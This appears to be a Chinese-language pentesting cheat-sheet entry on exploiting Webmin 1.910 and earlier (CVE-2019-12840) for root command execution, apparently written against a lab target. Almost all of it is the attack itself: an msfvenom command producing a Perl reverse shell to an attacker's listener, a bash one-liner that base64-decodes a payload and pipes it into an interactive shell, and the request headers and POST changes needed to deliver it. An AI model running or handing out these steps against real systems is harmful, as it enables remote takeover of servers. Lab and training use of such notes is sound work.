# webmin <=1.910

```bash
CVE-2019-12840：https://www.exploit-db.com/exploits/46984
```

Webmin 1.910 及更低版本中的任意命令执行漏洞\
直接提权

‍

```bash
1. 生成payload
msfvenom -p cmd/unix/reverse_perl LHOST=<LHOST> LPORT=4422 -f raw > rshell.pl
2. 先payload b64编码，再整段URL编码（如果在浏览器中）
bash -c "{echo,【base64之后的payload】}|{base64,-d}|{bash,-i}"
3. 抓包改包
	1. 增加两个头
Referer: https://10.129.2.1:10000/package-updates/?xnavigation=1
Content-Type: application/x-www-form-urlencoded
	2. 改成post
	3. 放入payload
4. 本地接shell
```
